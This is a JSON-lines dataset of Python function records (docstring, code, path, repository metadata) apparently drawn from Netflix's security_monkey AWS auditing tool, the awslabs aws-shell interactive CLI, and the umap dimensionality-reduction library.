{"docstring": "\"\"\"\n:returns: item_list - list of virtual gateways\n:returns: exception_map - A dict where the keys are a tuple containing the\n    location of the exception and the value is the actual exception\n\n\"\"\"\n", "func_signal": "def slurp(self):\n", "code": "self.prep_for_slurp()\nfrom security_monkey.common.sts_connect import connect\nitem_list = []\nexception_map = {}\nfor account in self.accounts:\n    for region in regions():\n        app.logger.debug(\n            \"Checking {}/{}/{}\".format(self.index, account, region.name))\n        try:\n            dc = connect(account, 'boto3.ec2.client', region=region)\n            response = self.wrap_aws_rate_limited_call(\n                dc.describe_vpn_gateways\n            )\n            gateways = response.get('VpnGateways')\n        except Exception as e:\n            if region.name not in TROUBLE_REGIONS:\n                exc = BotoConnectionIssue(\n                    str(e), self.index, account, region.name)\n                self.slurp_exception(\n                    (self.index, account, region.name), exc, exception_map)\n            continue\n        app.logger.debug(\"Found {} {}.\".format(\n            len(gateways), self.i_am_plural))\n        for gateway in gateways:\n\n            name = gateway['VpnGatewayId']\n            if self.check_ignore_list(name):\n                continue\n\n            config = {\n                'name': name,\n                'state': gateway.get('State'),\n                'type': gateway.get('Type'),\n                'vpcAttachments': gateway.get('VpcAttachments'),\n                'virtual_gateway_state': gateway.get('VirtualGatewayState')\n            }\n\n            item = VirtualGatewayItem(\n                region=region.name, account=account, name=name, config=dict(config), source_watcher=self)\n            item_list.append(item)\n\nreturn item_list, exception_map", "path": "security_monkey/security_monkey/watchers/direct_connect/virtual_gateway.py", "commit_date": "2018-01-24 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\nalert when an IAM Object has ec2:AuthorizeSecurityGroupEgress or ec2:AuthorizeSecurityGroupIngress.\n\"\"\"\n", "func_signal": "def check_security_group_permissions(self, item):\n", "code": "if not is_aws_managed_policy(item) or (is_aws_managed_policy(item) and has_attached_resources(item)):\n    super(ManagedPolicyAuditor, self).check_security_group_permissions(item)", "path": "security_monkey/security_monkey/auditors/iam/managed_policy.py", "commit_date": "2018-05-18 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\nAlert when an IAM Object has DataPlaneMutating permissions for sensitive services.\n\"\"\"\n", "func_signal": "def check_mutable_sensitive_services(self, item):\n", "code": "if not is_aws_managed_policy(item) or (is_aws_managed_policy(item) and has_attached_resources(item)):\n    super(ManagedPolicyAuditor, self).check_mutable_sensitive_services(item)", "path": "security_monkey/security_monkey/auditors/iam/managed_policy.py", "commit_date": "2018-05-18 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"Decorator: allow roles to access the view func with it.\n\n:param roles: List, each name of roles. Please note that,\n              `anonymous` is refered to anonymous.\n              If you add `anonymous` to the rule,\n              everyone can access the resource,\n              unless you deny other roles.\n:param methods: List, each name of methods.\n                methods is valid in ['GET', 'POST', 'PUT', 'DELETE']\n:param with_children: Whether allow children of roles as well.\n                      True by default.\n\"\"\"\n", "func_signal": "def allow(self, roles, methods, with_children=True):\n", "code": "def decorator(view_func):\n    _methods = [m.upper() for m in methods]\n    for r, m, v in itertools.product(roles, _methods, [view_func.__name__]):\n        self.before_acl.append((r, m, v, with_children))\n    return view_func\nreturn decorator", "path": "security_monkey/security_monkey/auth/modules.py", "commit_date": "2018-03-03 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"Return whether the current user can access the resource.\nExample::\n\n    @app.route('/some_url', methods=['GET', 'POST'])\n    @rbac.allow(['anonymous'], ['GET'])\n    def a_view_func():\n        return Response('Blah Blah...')\n\nIf you are not logged.\n\n`rbac.has_permission('GET', 'a_view_func')` return True.\n`rbac.has_permission('POST', 'a_view_func')` return False.\n\n:param method: The method wait to check.\n:param endpoint: The application endpoint.\n:param user: user who you need to check. Current user by default.\n\"\"\"\n", "func_signal": "def has_permission(self, method, endpoint, user=None):\n", "code": "app = self.get_app()\n_user = user or current_user\nroles = _user.get_roles()\nview_func = app.view_functions[endpoint]\nreturn self._check_permission(roles, method, view_func)", "path": "security_monkey/security_monkey/auth/modules.py", "commit_date": "2018-03-03 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\nHelper to look up an app.\n\"\"\"\n", "func_signal": "def get_app(self, reference_app=None):\n", "code": "if reference_app is not None:\n    return reference_app\nif self.app is not None:\n    return self.app\nctx = _app_ctx_stack.top\nif ctx is not None:\n    return ctx.app\nraise RuntimeError('application not registered on rbac '\n                   'instance and no application bound '\n                   'to current context')", "path": "security_monkey/security_monkey/auth/modules.py", "commit_date": "2018-03-03 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\n    .. http:get:: /api/1/account/<int:id>\n\n    Get a list of Accounts matching the given criteria\n\n    **Example Request**:\n\n    .. sourcecode:: http\n\n        GET /api/1/account/1 HTTP/1.1\n        Host: example.com\n        Accept: application/json, text/javascript\n\n    **Example Response**:\n\n    .. sourcecode:: http\n\n        HTTP/1.1 200 OK\n        Vary: Accept\n        Content-Type: application/json\n\n        {\n            third_party: false,\n            name: \"example_name\",\n            notes: null,\n            identifier: \"111111111111\",\n            active: true,\n            id: 1,\n            account_type: \"AWS\",\n            auth: {\n                authenticated: true,\n                user: \"user@example.com\"\n            }\n        }\n\n    :statuscode 200: no error\n    :statuscode 401: Authentication failure. Please login.\n\"\"\"\n\n", "func_signal": "def get(self, account_id):\n", "code": "result = get_account_by_id(account_id)\n\naccount_marshaled = marshal(result.__dict__, ACCOUNT_FIELDS)\naccount_marshaled = dict(\n    list(account_marshaled.items()) +\n    list({'account_type': result.account_type.name}.items())\n)\n\ncustom_fields_marshaled = []\nfor field in result.custom_fields:\n    field_marshaled = {\n                          'name': field.name,\n                          'value': field.value,\n                      }\n    custom_fields_marshaled.append(field_marshaled)\naccount_marshaled['custom_fields'] = custom_fields_marshaled\n\naccount_marshaled['auth'] = self.auth_dict\nreturn account_marshaled, 200", "path": "security_monkey/security_monkey/views/account.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\nalert when an IAM Object has a policy containing 'NotResource'.\nNotResource combined with an \"Effect\": \"Allow\" often provides more privilege\nthan is desired.\n\"\"\"\n", "func_signal": "def check_notresource(self, item):\n", "code": "if not is_aws_managed_policy(item) or (is_aws_managed_policy(item) and has_attached_resources(item)):\n    super(ManagedPolicyAuditor, self).check_notresource(item)", "path": "security_monkey/security_monkey/auditors/iam/managed_policy.py", "commit_date": "2018-05-18 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\" Searches for existing tickets based on the summary. If one exists,\nit will update the count and preserve any leading description text. If not, it will create a ticket. \"\"\"\n", "func_signal": "def add_or_update_issue(self, issue, technology, account, count):\n", "code": "summary = '{0} - {1} - {2}'.format(issue, technology, account)\n# Having dashes in JQL cuases it to return no results\nsummary_search = summary.replace('- ', '')\njql = 'project={0} and summary~\"{1}\"'.format(self.project, summary_search)\nissues = self.client.search_issues(jql)\n\nurl = \"{0}/#/issues/-/{1}/{2}/-/-/-/True/{3}/1/25\".format(self.url, technology, account, urllib.parse.quote(issue, ''))\ntimezone = time.tzname[time.localtime().tm_isdst]\ndescription = (\"This ticket was automatically created by Security Monkey. DO NOT EDIT SUMMARY OR BELOW THIS LINE\\n\"\n              \"Number of issues: {0}\\n\"\n              \"Account: {1}\\n\"\n              \"[View on Security Monkey|{2}]\\n\"\n              \"Last updated: {3} {4}\".format(count, account, url, datetime.datetime.now().isoformat(), timezone))\n\nfor issue in issues:\n    # Make sure we found the exact ticket\n    if issue.fields.summary == summary:\n        old_desc = issue.fields.description\n        old_desc = old_desc[:old_desc.find('This ticket was automatically created by Security Monkey')]\n        if self.only_update_on_change and issue.fields.description:\n            old_count = re.search(\"Number of issues: (\\d*)\\\\n\", issue.fields.description).group(1)\n            if int(old_count) != count:\n                # The count has changed so it still needs to be updated\n                issue.update(description=old_desc + description)\n                app.logger.debug(\"Updated issue {} ({})\".format(summary, issue.key))\n            else:\n                # The count hasn't changed so it will not be updated\n                app.logger.debug('Not updating issue, configured to only update if the count has changed.')\n        else:\n            issue.update(description=old_desc + description)\n            app.logger.debug(\"Updated issue {} ({})\".format(summary, issue.key))\n\n        if self.disable_transitions:\n            return\n\n        if issue.fields.status.name == app.config.get('JIRA_CLOSED', 'Closed') and count:\n            self.open_issue(issue)\n            app.logger.debug(\"Reopened issue {} ({})\".format(summary, issue.key))\n        elif issue.fields.status.name != app.config.get('JIRA_CLOSED', 'Closed') and count == 0:\n            self.close_issue(issue)\n            app.logger.debug(\"Closed issue {} ({})\".format(summary, issue.key))\n        return\n\n# Don't open a ticket with no issues\nif count == 0:\n    return\n\njira_args = {'project': {'key': self.project},\n             'issuetype': {'name': self.issue_type},\n             'summary': summary,\n             'description': description}\n\nif self.assignee is not None:\n    jira_args['assignee'] = {'name': self.assignee}\n\ntry:\n    issue = self.client.create_issue(**jira_args)\n    app.logger.debug(\"Created issue {} ({})\".format(summary, issue.key))\nexcept Exception as e:\n    app.logger.error(\"Error creating issue {}: {}\".format(summary, e))", "path": "security_monkey/security_monkey/jirasync.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\n    .. http:put:: /api/1/account/1\n\n    Edit an existing account.\n\n    **Example Request**:\n\n    .. sourcecode:: http\n\n        PUT /api/1/account/1 HTTP/1.1\n        Host: example.com\n        Accept: application/json\n\n        {\n            'name': 'edited_account'\n            'identifier': '0123456789',\n            'notes': 'this account is for ...',\n            'active': true,\n            'third_party': false\n        }\n\n    **Example Response**:\n\n    .. sourcecode:: http\n\n        HTTP/1.1 200 OK\n        Vary: Accept\n        Content-Type: application/json\n\n        {\n            'name': 'edited_account'\n            'identifier': '0123456789',\n            'notes': 'this account is for ...',\n            'active': true,\n            'third_party': false\n            'account_type': 'AWS'\n        }\n\n    :statuscode 200: no error\n    :statuscode 401: Authentication Error. Please Login.\n\"\"\"\n\n", "func_signal": "def put(self, account_id):\n", "code": "args = json.loads(request.json)\naccount_type = args['account_type']\nname = args['name']\nidentifier = args['identifier']\nnotes = args['notes']\nactive = args['active']\nthird_party = args['third_party']\ncustom_fields = args['custom_fields']\n\nfrom security_monkey.account_manager import account_registry\naccount_manager = account_registry.get(account_type)()\n\ntry:\n    account = account_manager.update(account_id, account_type, name, active, third_party, notes, identifier,\n                                     custom_fields=custom_fields)\nexcept AccountNameExists as _:\n    return {'status': 'error. Account name exists.'}, 409\n\nif not account:\n    return {'status': 'error. Account ID not found.'}, 404\n\nfrom security_monkey.common.audit_issue_cleanup import clean_account_issues\nclean_account_issues(account)\n\nmarshaled_account = marshal(account.__dict__, ACCOUNT_FIELDS)\nmarshaled_account['auth'] = self.auth_dict\n\nreturn marshaled_account, 200", "path": "security_monkey/security_monkey/views/account.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\" Runs add_or_update_issue for every AuditorSetting, filtered by technology\nand accounts, if provided. \"\"\"\n", "func_signal": "def sync_issues(self, accounts=None, tech_name=None):\n", "code": "query = AuditorSettings.query.join(\n    (Technology, Technology.id == AuditorSettings.tech_id)\n).join(\n    (Account, Account.id == AuditorSettings.account_id)\n).filter(\n    (AuditorSettings.disabled == False)\n)\nif accounts:\n    query = query.filter(Account.name.in_(accounts))\nif tech_name:\n    query = query.filter(Technology.name == tech_name)\n\nfor auditorsetting in query.all():\n    unjustified = [issue for issue in auditorsetting.issues if not issue.justified]\n    self.add_or_update_issue(auditorsetting.issue_text,\n                             auditorsetting.technology.name,\n                             auditorsetting.account.name,\n                             len(unjustified))", "path": "security_monkey/security_monkey/jirasync.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\nDecorator function\nExempt a view function from being checked permission.\n\"\"\"\n", "func_signal": "def exempt(self, view_func):\n", "code": "self.acl.exempt(view_func.__name__)\nreturn view_func", "path": "security_monkey/security_monkey/auth/modules.py", "commit_date": "2018-03-03 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"Open application's history buffer in an editor.\n\n:type command: list\n:param command: The dot command as a list split\n    on whitespace, e.g ``['.foo', 'arg1', 'arg2']``\n\n:type application: AWSShell\n:param application: The application object.\n\n\"\"\"\n", "func_signal": "def run(self, command, application):\n", "code": "with temporary_file('w') as f:\n    all_commands = self._generate_edit_history(application)\n    f.write(all_commands)\n    f.flush()\n    editor = self._get_editor_command()\n    try:\n        p = self._popen_cls([editor, f.name])\n        p.communicate()\n    except OSError:\n        self._err.write(\"Unable to launch editor: %s\\n\"\n                        \"You can configure which editor to use by \"\n                        \"exporting the EDITOR environment variable.\\n\"\n                        % editor)", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Load the completion index for a given CLI version.\n\n:type version_string: str\n:param version_string: The AWS CLI version, e.g \"1.9.2\".\n\n:raises: :class:`IndexLoadError <exceptions.IndexLoadError>`\n\"\"\"\n", "func_signal": "def load_index(self, version_string):\n", "code": "filename = self._filename_for_version(version_string)\ntry:\n    contents = self._fslayer.file_contents(filename)\nexcept FileReadError as e:\n    raise IndexLoadError(str(e))\nreturn contents", "path": "aws-shell/awsshell/index/completion.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "# A CommandLineInterface from prompt_toolkit\n# accepts two things: an application and an\n# event loop.\n", "func_signal": "def create_cli_interface(self, display_completions_in_columns):\n", "code": "loop = create_eventloop()\napp = self.create_application(self.completer,\n                              self.file_history,\n                              display_completions_in_columns)\ncli = CommandLineInterface(application=app, eventloop=loop,\n                           input=self._input, output=self._output)\nreturn cli", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Load completions from the completion index.\n\nUpdates the following attributes:\n    * commands\n    * subcommands\n    * global_opts\n    * args_opts\n\"\"\"\n", "func_signal": "def load_completions(self):\n", "code": "try:\n    index_str = self.load_index(utils.AWSCLI_VERSION)\nexcept IndexLoadError:\n    return\nindex_str = self.load_index(utils.AWSCLI_VERSION)\nindex_data = json.loads(index_str)\nindex_root = index_data['aws']\n# ec2, s3, elb...\nself.commands = index_root['commands']\n# --profile, --region, --output...\nself.global_opts = index_root['arguments']\nfor command in self.commands:\n    # ec2: start-instances, stop-instances, terminate-instances...\n    subcommands_current = index_root['children'] \\\n        .get(command)['commands']\n    self.subcommands.extend(subcommands_current)\n    for subcommand_current in subcommands_current:\n        # start-instances: --instance-ids, --dry-run...\n        args_opts_current = index_root['children'] \\\n            .get(command)['children'] \\\n            .get(subcommand_current)['arguments']\n        self.args_opts.update(args_opts_current)", "path": "aws-shell/awsshell/index/completion.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Load the config file if it exists, else read the default config.\n\n:type template_path: str\n:param template_path: The template config file path.\n\n:type config_path: str\n:param config_path: The user's config file path.\n\n:rtype: :class:`configobj.ConfigObj`\n:return: The config information for reading and writing.\n\"\"\"\n", "func_signal": "def _load_template_or_config(self, template_path, config_path):\n", "code": "expanded_config_path = os.path.expanduser(config_path)\ncfg = ConfigObj()\ncfg.filename = expanded_config_path\ncfg.merge(ConfigObj(template_path, interpolation=False))\ncfg.merge(ConfigObj(expanded_config_path, interpolation=False))\nreturn cfg", "path": "aws-shell/awsshell/config.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Create the :class:`KeyManager`.\n\nThe inputs to KeyManager are expected to be callable, so we can't\nuse the standard @property and @attrib.setter for these attributes.\nLambdas cannot contain assignments so we're forced to define setters.\n\n:rtype: :class:`KeyManager`\n:return: A KeyManager with callables to set the toolbar options.  Also\n    includes the method stop_input_and_refresh_cli to ensure certain\n    options take effect within the current session.\n\n\"\"\"\n", "func_signal": "def create_key_manager(self):\n", "code": "def set_match_fuzzy(match_fuzzy):\n    \"\"\"Setter for fuzzy matching mode.\n\n    :type match_fuzzy: bool\n    :param match_fuzzy: The match fuzzy flag.\n\n    \"\"\"\n    self.model_completer.match_fuzzy = match_fuzzy\n\ndef set_enable_vi_bindings(enable_vi_bindings):\n    \"\"\"Setter for vi mode keybindings.\n\n    If vi mode is off, emacs mode is enabled by default by\n    `prompt_toolkit`.\n\n    :type enable_vi_bindings: bool\n    :param enable_vi_bindings: The enable Vi bindings flag.\n\n    \"\"\"\n    self.enable_vi_bindings = enable_vi_bindings\n\ndef set_show_completion_columns(show_completion_columns):\n    \"\"\"Setter for showing the completions in columns flag.\n\n    :type show_completion_columns: bool\n    :param show_completion_columns: The show completions in\n        multiple columns flag.\n\n    \"\"\"\n    self.show_completion_columns = show_completion_columns\n\ndef set_show_help(show_help):\n    \"\"\"Setter for showing the help container flag.\n\n    :type show_help: bool\n    :param show_help: The show help flag.\n\n    \"\"\"\n    self.show_help = show_help\n\nreturn KeyManager(\n    lambda: self.model_completer.match_fuzzy, set_match_fuzzy,\n    lambda: self.enable_vi_bindings, set_enable_vi_bindings,\n    lambda: self.show_completion_columns, set_show_completion_columns,\n    lambda: self.show_help, set_show_help,\n    self.stop_input_and_refresh_cli)", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Change the profile used for server side completions.\"\"\"\n", "func_signal": "def change_profile(self, profile_name):\n", "code": "self._server_side_completer = self._create_server_side_completer(\n    session=botocore.session.Session(profile=profile_name))", "path": "aws-shell/awsshell/shellcomplete.py", "commit_date": "2015-12-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "# command is a list of parsed commands\n", "func_signal": "def run(self, command, application):\n", "code": "if len(command) != 2:\n    self._err.write(\"invalid syntax, must be: .cd dirname\\n\")\n    return\ndirname = os.path.expandvars(os.path.expanduser(command[1]))\ntry:\n    self._chdir(dirname)\nexcept OSError as e:\n    self._err.write(\"cd: %s\\n\" % e)", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Cross platform temporary file creation.\n\nThis is an alternative to ``tempfile.NamedTemporaryFile`` that\nalso works on windows and avoids the \"file being used by\nanother process\" error.\n\"\"\"\n", "func_signal": "def temporary_file(mode):\n", "code": "tempdir = tempfile.gettempdir()\nbasename = 'tmpfile-%s' % (uuid.uuid4())\nfull_filename = os.path.join(tempdir, basename)\nif 'w' not in mode:\n    # We need to create the file before we can open\n    # it in 'r' mode.\n    open(full_filename, 'w').close()\ntry:\n    with open(full_filename, mode) as f:\n        yield f\nfinally:\n    os.remove(f.name)", "path": "aws-shell/awsshell/utils.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Stop input by raising an `InputInterrupt`, forces a cli refresh.\n\nThe cli refresh is necessary because changing options such as key\nbindings, single vs multi column menu completions, and the help pane\nall require a rebuild.\n\n:raises: :class:`InputInterrupt <exceptions.InputInterrupt>`.\n\n\"\"\"\n", "func_signal": "def stop_input_and_refresh_cli(self):\n", "code": "self.refresh_cli = True\nself.cli.request_redraw()\nraise InputInterrupt", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Load the config from the config file or template.\"\"\"\n", "func_signal": "def load_config(self):\n", "code": "config = Config()\nself.config_obj = config.load('awsshellrc')\nself.config_section = self.config_obj['aws-shell']\nself.model_completer.match_fuzzy = self.config_section.as_bool(\n    'match_fuzzy')\nself.enable_vi_bindings = self.config_section.as_bool(\n    'enable_vi_bindings')\nself.show_completion_columns = self.config_section.as_bool(\n    'show_completion_columns')\nself.show_help = self.config_section.as_bool('show_help')\nself.theme = self.config_section['theme']", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "# This is something we can fix, but for now the resource\n# must be in the hasMany.\n", "func_signal": "def test_resource_not_included_if_no_has_many():\n", "code": "resource = {\n    'service': {\n        'hasMany': {}\n    },\n    'resources': {\n        'Tag': {\n            'actions': {\n                'Delete': {\n                    'request': {\n                        'operation': 'DeleteTags',\n                        'params': [\n                            {'target': 'Resources[0]',\n                             'source': 'identifier',\n                             'name': 'ResourceId'},\n                        ]\n                    }\n                }\n            }\n        }\n    }\n}\nbuilder = index.ResourceIndexBuilder()\nbuilt_index = builder.build_index(resource)\n# The index is empty because there was not matching\n# hasMany resource.\nassert built_index == {\n    'operations': {},\n    'resources': {},\n}", "path": "aws-shell/tests/unit/test_resources.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Save the config to the config file.\"\"\"\n", "func_signal": "def save_config(self):\n", "code": "self.config_section['match_fuzzy'] = self.model_completer.match_fuzzy\nself.config_section['enable_vi_bindings'] = self.enable_vi_bindings\nself.config_section['show_completion_columns'] = \\\n    self.show_completion_columns\nself.config_section['show_help'] = self.show_help\nself.config_section['theme'] = self.theme\nself.config_obj.write()", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "# There's only two things that need to know about new profile\n# changes.\n#\n# First, the actual command runner.  If we want\n# to use a different profile, it should ensure that the CLI\n# commands that get run use the new profile (via the\n# AWS_DEFAULT_PROFILE env var).\n#\n# Second, we also need to let the server side autocompleter know.\n#\n# Given this is easy to manage by hand, I don't think\n# it's worth adding an event system or observers just yet.\n# If this gets hard to manage, the complexity of those systems\n# would be worth it.\n", "func_signal": "def profile(self, new_profile_name):\n", "code": "self._env['AWS_DEFAULT_PROFILE'] = new_profile_name\nself.completer.change_profile(new_profile_name)\nself._profile = new_profile_name", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "# Internally, most of the speedup comes from\n# the fact that this data is pre-rendered and\n# indexed.\n", "func_signal": "def __init__(self, doc_index):\n", "code": "self._doc_index = doc_index\nself._cache = {}", "path": "aws-shell/awsshell/docs.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Get or set the profile.\n\nIf .profile is called with no args, the current profile\nis displayed.  If the .profile command is called with a\nsingle arg, then the current profile for the application\nwill be set to the new value.\n\"\"\"\n", "func_signal": "def run(self, command, application):\n", "code": "if len(command) == 1:\n    profile = application.profile\n    if profile is None:\n        self._output.write(\n            \"Current shell profile: no profile configured\\n\"\n            \"You can change profiles using: .profile profile-name\\n\")\n    else:\n        self._output.write(\"Current shell profile: %s\\n\" % profile)\nelif len(command) == 2:\n    new_profile_name = command[1]\n    application.profile = new_profile_name\n    self._output.write(\"Current shell profile changed to: %s\\n\" %\n                       new_profile_name)\nelse:\n    self._err.write(\"Usage:\\n%s\\n\" % self.USAGE)", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "# HTMLParser is an old-style class, which can't be used with super()\n", "func_signal": "def __init__(self):\n", "code": "HTMLParser.__init__(self)\nself.reset()\nself.lines = []", "path": "aws-shell/awsshell/utils.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Handle running a given dot command from a user.\n\n:type command: str\n:param command: The full dot command string, e.g. ``.edit``,\n    of ``.profile prod``.\n\n:type application: AWSShell\n:param application: The application object.\n\n\"\"\"\n", "func_signal": "def handle_cmd(self, command, application):\n", "code": "parts = command.split()\ncmd_name = parts[0][1:]\nif cmd_name not in self.HANDLER_CLASSES:\n    self._unknown_cmd(parts, application)\nelse:\n    # Note we expect the class to support no-arg\n    # instantiation.\n    return self.HANDLER_CLASSES[cmd_name]().run(parts, application)", "path": "aws-shell/awsshell/app.py", "commit_date": "2017-08-30 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Return the file for a given filename.\n\nIf you want binary content use ``mode='rb'``.\n\n\"\"\"\n", "func_signal": "def file_contents(self, filename, binary=False):\n", "code": "if binary:\n    mode = 'rb'\nelse:\n    mode = 'r'\ntry:\n    with open(filename, mode) as f:\n        return f.read()\nexcept (OSError, IOError) as e:\n    raise FileReadError(str(e))", "path": "aws-shell/awsshell/utils.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"Read the config file if it exists, else read the default config.\n\nCreates the user config file if it doesn't exist using the template.\n\n:type config_template: str\n:param config_template: The config template file name.\n\n:type config_file: str\n:param config_file: (Optional) The config file name.\n    If None, the config_file name will be set to the config_template.\n\n:rtype: :class:`configobj.ConfigObj`\n:return: The config information for reading and writing.\n\"\"\"\n", "func_signal": "def load(self, config_template, config_file=None):\n", "code": "if config_file is None:\n    config_file = config_template\nconfig_path = build_config_file_path(config_file)\ntemplate_path = os.path.join(os.path.dirname(__file__),\n                             config_template)\nself._copy_template_to_config(template_path, config_path)\nreturn self._load_template_or_config(template_path, config_path)", "path": "aws-shell/awsshell/config.py", "commit_date": "2015-12-29 00:00:00", "repo_name": "awslabs/aws-shell", "stars": 7098, "license": "apache-2.0", "language": "python", "size": 283}
{"docstring": "\"\"\"tests saving and loading\"\"\"\n", "func_signal": "def test_save_load():\n", "code": "X, y = make_moons(100)\nembedder = ParametricUMAP()\nembedding = embedder.fit_transform(X)\n\n# if platform.system() != \"Windows\":\n# Portable tempfile\nmodel_path = tempfile.mkdtemp(suffix=\"_umap_model\")\n\nembedder.save(model_path)\nembedder = load_ParametricUMAP(model_path)", "path": "umap/umap/tests/test_parametric_umap.py", "commit_date": "2020-11-22 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "# Dense data for testing small n\n", "func_signal": "def repetition_dense():\n", "code": "return np.array(\n    [\n        [5, 6, 7, 8],\n        [5, 6, 7, 8],\n        [5, 6, 7, 8],\n        [5, 6, 7, 8],\n        [5, 6, 7, 8],\n        [5, 6, 7, 8],\n        [1, 1, 1, 1],\n        [1, 2, 3, 4],\n        [1, 1, 2, 1],\n    ]\n)", "path": "umap/umap/tests/conftest.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"tests inverse_transform\"\"\"\n\n", "func_signal": "def test_inverse_transform():\n", "code": "def norm(x):\n    return (x - np.min(x)) / (np.max(x) - np.min(x))\n\nX, y = make_moons(100)\nX = norm(X)\nembedder = ParametricUMAP(parametric_reconstruction=True)\nembedding = embedder.fit_transform(X)\nZ = embedder.transform(X)\nX_r = embedder.inverse_transform(Z)", "path": "umap/umap/tests/test_parametric_umap.py", "commit_date": "2020-11-22 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
{"docstring": "\"\"\"Standard clamping of a value into a fixed range (in this case -4.0 to\n4.0)\n\nParameters\n----------\nval: float\n    The value to be clamped.\n\nReturns\n-------\nThe clamped value, now fixed to be in the range -4.0 to 4.0.\n\"\"\"\n", "func_signal": "def clip(val):\n", "code": "if val > 4.0:\n    return 4.0\nelif val < -4.0:\n    return -4.0\nelse:\n    return val", "path": "umap/umap/layouts.py", "commit_date": "2020-11-22 00:00:00", "repo_name": "lmcinnes/umap", "stars": 6823, "license": "bsd-3-clause", "language": "python", "size": 61740}
